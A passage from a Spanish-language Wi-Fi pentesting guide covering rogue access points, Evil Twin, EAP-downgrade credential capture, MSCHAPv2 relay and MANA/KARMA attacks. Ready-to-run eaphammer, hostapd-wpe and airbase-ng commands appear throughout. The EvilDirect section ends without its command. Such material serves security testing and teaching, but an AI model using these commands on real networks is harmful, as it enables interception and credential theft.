apt-get install dnsmasq #Manages DHCP and DNS
```
Crea el archivo de configuración `/etc/dnsmasq.conf`:
```ini
interface=wlan0
dhcp-authoritative
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
```
Luego **set IPs** y **routes**:
```bash
ifconfig wlan0 up 192.168.1.1 netmask 255.255.255.0
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
```
Y luego **inicia** dnsmasq:
```bash
dnsmasq -C dnsmasq.conf -d
```
### hostapd
```bash
apt-get install hostapd
```
Crea un archivo de configuración `hostapd.conf`:
```ini
interface=wlan0
driver=nl80211
ssid=MITIWIFI
hw_mode=g
channel=11
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=mitmwifi123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_group_rekey=86400
ieee80211n=1
wme_enabled=1
```
**Detén procesos molestos**, configura **monitor mode**, e inicia **hostapd**:
```bash
airmon-ng check kill
iwconfig wlan0 mode monitor
ifconfig wlan0 up
hostapd ./hostapd.conf
```
### Reenvío y redirección
```bash
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface wlan0 -j ACCEPT
echo 1 > /proc/sys/net/ipv4/ip_forward
```
## Evil Twin

Un ataque Evil Twin explota la forma en que los clientes WiFi reconocen redes, basándose principalmente en el nombre de la red (ESSID) sin exigir que la estación base (access point) se autentique ante el cliente. Puntos clave:

- **Dificultad para diferenciar**: Los dispositivos tienen problemas para distinguir entre access points legítimos y rogue access points cuando comparten el mismo ESSID y tipo de cifrado. Las redes reales suelen usar múltiples access points con el mismo ESSID para ampliar la cobertura de forma transparente.
- **Roaming del cliente y manipulación de la conexión**: El protocolo 802.11 permite a los dispositivos desplazarse entre access points dentro del mismo ESS. Los atacantes pueden explotar esto atrayendo a un dispositivo para que se desconecte de su estación base actual y se conecte a una rogue access point. Esto se puede lograr ofreciendo una señal más fuerte o interrumpiendo la conexión al access point legítimo mediante métodos como deauthentication packets o jamming.
- **Desafíos en la ejecución**: Ejecutar con éxito un ataque Evil Twin en entornos con múltiples access points bien colocados puede ser complicado. Deauthenticate un único access point legítimo a menudo provoca que el dispositivo se conecte a otro access point legítimo, a menos que el atacante pueda deauthenticate todos los access points cercanos o colocar estratégicamente la rogue access point.

Puedes crear un Open Evil Twin muy básico (sin capacidad para enrutar tráfico a Internet) haciendo:
```bash
airbase-ng -a 00:09:5B:6F:64:1E --essid "Elroy" -c 1 wlan0mon
```
También puedes crear un Evil Twin usando **eaphammer** (fíjate que para crear evil twins con eaphammer la interfaz **NO debe estar** en modo **monitor**):
```bash
./eaphammer -i wlan0 --essid exampleCorp --captive-portal
```
O usando Airgeddon: `Options: 5,6,7,8,9 (inside Evil Twin attack menu).`

![](<../../images/image (1088).png>)

Por favor, ten en cuenta que por defecto, si un ESSID en la PNL está guardado como protegido por WPA, el dispositivo no se conectará automáticamente a un Open evil Twin. Puedes intentar hacer DoS al AP real y esperar que el usuario se conecte manualmente a tu Open evil twin, o puedes hacer DoS al AP real y usar un WPA Evil Twin para capturar el handshake (usando este método no podrás permitir que la víctima se conecte a ti ya que no conoces el PSK, pero puedes capturar el handshake e intentar crackearlo).

_Some OS and AV will warn the user that connect to an Open network is dangerous..._

### WPA/WPA2 Evil Twin

Puedes crear un Evil Twin usando WPA/2 y, si los dispositivos están configurados para conectarse a ese SSID con WPA/2, intentarán conectarse. De todos modos, para completar el 4-way-handshake también necesitas conocer la contraseña que el cliente va a usar. Si no la conoces, la conexión no se completará.
```bash
./eaphammer -i wlan0 -e exampleCorp -c 11 --creds --auth wpa-psk --wpa-passphrase "mywifipassword"
```
### Enterprise Evil Twin

Para entender este ataque, recomiendo leer antes el breve [WPA Enterprise explanation](#wpa-enterprise-mgt).

**Usando hostapd-wpe**

`hostapd-wpe` necesita un archivo de **configuración** para funcionar. Para **automatizar** la generación de estas configuraciones puedes usar [https://github.com/WJDigby/apd_launchpad](https://github.com/WJDigby/apd_launchpad) (descarga el archivo python dentro de _/etc/hostapd-wpe_/)
```bash
./apd_launchpad.py -t victim -s PrivateSSID -i wlan0 -cn company.com
hostapd-wpe ./victim/victim.conf -s
```
En el archivo de configuración puedes seleccionar muchas cosas diferentes como ssid, channel, user files, cret/key, dh parameters, wpa version y auth...

[**Usando hostapd-wpe con EAP-TLS para permitir que cualquier certificado inicie sesión.**](evil-twin-eap-tls.md)

**Usando EAPHammer**
```bash
# Generate Certificates
./eaphammer --cert-wizard

# Launch Attack
./eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CorpWifi --creds
```
Por defecto, EAPHammer utiliza estos authentication methods (nota GTC como el primero en intentar obtener plaintext passwords y luego el uso de auth methods más robustos):
```
GTC,MSCHAPV2,TTLS-MSCHAPV2,TTLS,TTLS-CHAP,TTLS-PAP,TTLS-MSCHAP,MD5
```
Esta es la metodología predeterminada para evitar largos tiempos de conexión. Sin embargo, también puedes especificar al server los authentication methods de los más débiles a los más fuertes:
```
--negotiate weakest
```
O también podrías usar:

- `--negotiate gtc-downgrade` to use highly efficient GTC downgrade implementation (contraseñas en texto claro)
- `--negotiate manual --phase-1-methods PEAP,TTLS --phase-2-methods MSCHAPV2,GTC,TTLS-PAP` to specify manually the methods offered (ofreciendo los mismos métodos de autenticación en el mismo orden que la organización, el ataque será mucho más difícil de detectar).
- [Find more info in the wiki](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)

#### Cuando los clientes omiten la validación del certificado RADIUS (PEAP/TTLS)

- Si los dispositivos están configurados con "do not validate certificate", un AP clonado + RADIUS malicioso (`eaphammer --cert-wizard --creds --auth wpa-eap`) recopilará **NetNTLMv2** (PEAP-MSCHAPv2) o credenciales en **texto claro** (PEAP-GTC). `bettercap` deauth (`wifi.deauth <BSSID>`) tanto revela SSIDs ocultos durante las probes como fuerza reconexiones, a menos que PMF/802.11w bloquee deauths suplantados.
- Un NetNTLMv2 crackeado proporciona credenciales reutilizables para Wi‑Fi/AD; GTC proporciona inmediatamente contraseñas en texto claro.

#### Relevo de PEAP-MSCHAPv2 en lugar de crackear (wpa_sycophant + hostapd-mana)

- Para cuentas de máquina con contraseñas aleatorias no crackeables, abusa del **MSCHAPv2 relay**: ejecuta `hostapd-mana` como el Evil Twin, reenviando el intercambio MSCHAPv2 a `wpa_sycophant`, que simultáneamente se conecta al AP legítimo. Un relay exitoso concede acceso Wi‑Fi autenticado sin recuperar la contraseña.
- Usa builds que soporten el nivel de seguridad objetivo (WPA3/PMF requiere hostapd/wpa_supplicant recientes); PMF evita la coerción por deauth, así que espera asociaciones voluntarias de clientes.

**Using Airgeddon**

`Airgeddon` puede usar certificados previamente generados para ofrecer autenticación EAP a redes WPA/WPA2-Enterprise. La red falsa degradará el protocolo de conexión a EAP-MD5 para que pueda **capturar al usuario y el MD5 de la contraseña**. Más tarde, el atacante puede intentar crackear la contraseña.\
`Airggedon` te ofrece la posibilidad de un **Evil Twin continuo (noisy)** o **crear el Evil Attack solo hasta que alguien se conecte (smooth).**

![](<../../images/image (936).png>)

### Debugging PEAP and EAP-TTLS TLS tunnels in Evil Twins attacks

_Este método fue probado en una conexión PEAP, pero como estoy descifrando un túnel TLS arbitrario esto también debería funcionar con EAP-TTLS_

Dentro de la **configuration** de _hostapd-wpe_ **comment** la línea que contiene _**dh_file**_ (from `dh_file=/etc/hostapd-wpe/certs/dh` to `#dh_file=/etc/hostapd-wpe/certs/dh`)\
Esto hará que `hostapd-wpe` **exchange keys using RSA** en lugar de DH, por lo que podrás **decrypt** el tráfico después sabiendo la **servers private key**.

Ahora inicia el **Evil Twin** usando **`hostapd-wpe`** con esa configuración modificada como de costumbre. Además, inicia **`wireshark`** en la **interface** que está realizando el ataque Evil Twin.

Ahora o más tarde (cuando ya hayas capturado algunos intentos de autenticación) puedes añadir la clave RSA privada a wireshark en: `Edit --> Preferences --> Protocols --> TLS --> (RSA keys list) Edit...`

Añade una nueva entrada y rellena el formulario con estos valores: **IP address = any** -- **Port = 0** -- **Protocol = data** -- **Key File** (**select your key file**, para evitar problemas selecciona un key file **without being password protected**).

![](<../../images/image (687).png>)

Y mira la nueva pestaña **"Decrypted TLS"**:

![](<../../images/image (231).png>)

## Ataque KARMA, MANA, Loud MANA y Known beacons

### Listas negras/blancas de ESSID y MAC

Diferentes tipos de Media Access Control Filter Lists (MFACLs) y sus modos correspondientes y efectos sobre el comportamiento de un Access Point (AP) malicioso:

1. **MAC-based Whitelist**:
- El AP malicioso responderá solo a probe requests de los dispositivos especificados en la whitelist, permaneciendo invisible para todos los demás no listados.
2. **MAC-based Blacklist**:
- El AP malicioso ignorará probe requests de los dispositivos en la blacklist, haciendo que el AP malicioso sea efectivamente invisible para esos dispositivos específicos.
3. **SSID-based Whitelist**:
- El AP malicioso responderá a probe requests solo para ESSIDs específicos listados, volviéndose invisible para dispositivos cuyas Preferred Network Lists (PNLs) no contengan esos ESSIDs.
4. **SSID-based Blacklist**:
- El AP malicioso no responderá a probe requests para los ESSIDs específicos en la blacklist, haciéndolo invisible para dispositivos que buscan esas redes en particular.
```bash
# example EAPHammer MFACL file, wildcards can be used
09:6a:06:c8:36:af
37:ab:46:7a:9a:7c
c7:36:8c:b2:*:*

[--mac-whitelist /path/to/mac/whitelist/file.txt #EAPHammer whitelisting]
[--mac-blacklist /path/to/mac/blacklist/file.txt #EAPHammer blacklisting]
```

```bash
# example ESSID-based MFACL file
name1
name2
name3

[--ssid-whitelist /path/to/mac/whitelist/file.txt]
[--ssid-blacklist /path/to/mac/blacklist/file.txt]
```
### KARMA

Este método permite a un **atacante crear un access point (AP) malicioso que responde a todas las probe requests** de dispositivos que buscan conectarse a redes. Esta técnica **engaña a los dispositivos para que se conecten al AP del atacante** al imitar las redes que los dispositivos están buscando. Una vez que un dispositivo envía una connection request a este AP rogue, se completa la conexión, provocando que el dispositivo se conecte por error a la red del atacante.

### MANA

Luego, **los dispositivos empezaron a ignorar respuestas de red poco fiables**, reduciendo la efectividad del ataque karma original. Sin embargo, se introdujo un nuevo método, conocido como el **MANA attack**, por Ian de Villiers y Dominic White. Este método implica que el AP rogue **capture las Preferred Network Lists (PNL) de los dispositivos al responder a sus broadcast probe requests** con nombres de red (SSIDs) previamente vistos por los dispositivos. Este sofisticado ataque elude las protecciones contra el karma original al explotar la forma en que los dispositivos recuerdan y priorizan las redes conocidas.

El MANA attack opera monitorizando tanto las directed como las broadcast probe requests de los dispositivos. Para las directed requests, registra la MAC address del dispositivo y el nombre de red solicitado, añadiendo esta información a una lista. Cuando se recibe una broadcast request, el AP responde con información que coincide con cualquiera de las redes en la lista del dispositivo, tentando al dispositivo a conectarse al AP rogue.
```bash
./eaphammer -i wlan0 --cloaking full --mana --mac-whitelist whitelist.txt [--captive-portal] [--auth wpa-psk --creds]
```
### Loud MANA

Una **Loud MANA attack** es una estrategia avanzada para cuando los dispositivos no utilizan directed probing o cuando sus Preferred Network Lists (PNL) son desconocidas para el atacante. Opera bajo el principio de que **los dispositivos en la misma área probablemente compartan algunos nombres de red en sus PNL**. En lugar de responder de forma selectiva, este ataque transmite probe responses para cada nombre de red (ESSID) encontrado en las PNL combinadas de todos los dispositivos observados. Este enfoque amplio aumenta la probabilidad de que un dispositivo reconozca una red familiar e intente conectarse al rogue Access Point (AP).
```bash
./eaphammer -i wlan0 --cloaking full --mana --loud [--captive-portal] [--auth wpa-psk --creds]
```
### Known Beacon attack

Cuando el **Loud MANA attack** puede no ser suficiente, el **Known Beacon attack** presenta otro enfoque. Este método **brute-forces el proceso de conexión simulando un AP que responde a cualquier nombre de red, recorriendo una lista de posibles ESSIDs** derivadas de un wordlist. Esto simula la presencia de numerosas redes, con la esperanza de coincidir con un ESSID dentro del PNL de la víctima, lo que provoca un intento de conexión al AP fabricado. El ataque puede intensificarse combinándolo con la opción `--loud` para un intento más agresivo de atraer dispositivos.

Eaphammer implementó este ataque como un MANA attack en el que todos los ESSIDs de una lista se anuncian (también podrías combinar esto con `--loud` para crear un Loud MANA + Known beacons attack):
```bash
./eaphammer -i wlan0 --mana [--loud] --known-beacons  --known-ssids-file wordlist.txt [--captive-portal] [--auth wpa-psk --creds]
```
**Known Beacon Burst attack**

La **Known Beacon Burst attack** implica **rapid-fire broadcasting of beacon frames for each ESSID listed in a file**. Esto crea un entorno denso de redes falsas, aumentando considerablemente la probabilidad de que los dispositivos se conecten al rogue AP, especialmente cuando se combina con un MANA attack. Esta técnica aprovecha la velocidad y el volumen para saturar los mecanismos de selección de red de los dispositivos.
```bash
# transmit a burst of 5 forged beacon packets for each entry in list
./forge-beacons -i wlan1 \
--bssid de:ad:be:ef:13:37 \
--known-essids-file known-s.txt \
--dst-addr 11:22:33:11:22:33 \
--burst-count 5
```
## Wi-Fi Direct

**Wi-Fi Direct** es un protocolo que permite que dispositivos se conecten directamente entre sí usando Wi-Fi sin necesidad de un punto de acceso inalámbrico tradicional. Esta capacidad está integrada en varios dispositivos IoT, como impresoras y televisores, facilitando la comunicación directa entre dispositivos. Una característica notable de Wi-Fi Direct es que un dispositivo asume el rol de access point, conocido como group owner, para gestionar la conexión.

La seguridad de las conexiones Wi-Fi Direct se establece mediante **Wi-Fi Protected Setup (WPS)**, que soporta varios métodos para el emparejamiento seguro, incluyendo:

- **Push-Button Configuration (PBC)**
- **PIN entry**
- **Near-Field Communication (NFC)**

Estos métodos, en particular la entrada por PIN, son susceptibles a las mismas vulnerabilidades que WPS en redes Wi-Fi tradicionales, lo que los convierte en objetivos para vectores de ataque similares.

### EvilDirect Hijacking

**EvilDirect Hijacking** es un ataque específico de Wi-Fi Direct. Refleja el concepto de un ataque Evil Twin pero dirigido a conexiones Wi-Fi Direct. En este escenario, un atacante se hace pasar por un group owner legítimo con el objetivo de engañar a los dispositivos para que se conecten a una entidad maliciosa. Este método puede ejecutarse usando herramientas como `airbase-ng` especificando el canal, ESSID y la dirección MAC del dispositivo suplantado:

## Referencias

- [https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee](https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee)
- [https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9](https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9)
- [https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38](https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38)
- [https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d](https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d)
- [https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf](https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf)
- [http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)
- [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
- [https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d](https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d)
- [https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)](<https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)>)
- [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
- [The vulnerability that killed FreeWifi_Secure](https://7h30th3r0n3.fr/the-vulnerability-that-killed-freewifi_secure/)
- [RFC 4186 – EAP-SIM Authentication](https://datatracker.ietf.org/doc/html/rfc4186)
- [3GPP TS 33.402 – 3GPP system architecture evolution (SAE); Security aspects of non-3GPP accesses](https://www.3gpp.org/ftp/Specs/archive/33_series/33.402/)
- [Wireless-(in)Fidelity: Pentesting Wi-Fi in 2025 (Synacktiv)](https://www.synacktiv.com/en/publications/wireless-infidelity-pentesting-wi-fi-in-2025.html)
- [PEAP relay attacks with wpa_sycophant (SensePost)](https://sensepost.com/blog/2019/peap-relay-attacks-with-wpa_sycophant/)


TODO: Take a look to [https://github.com/wifiphisher/wifiphisher](https://github.com/wifiphisher/wifiphisher) (login con facebook e imitacionde WPA en captive portals)

{{#include ../../banners/hacktricks-training.md}}
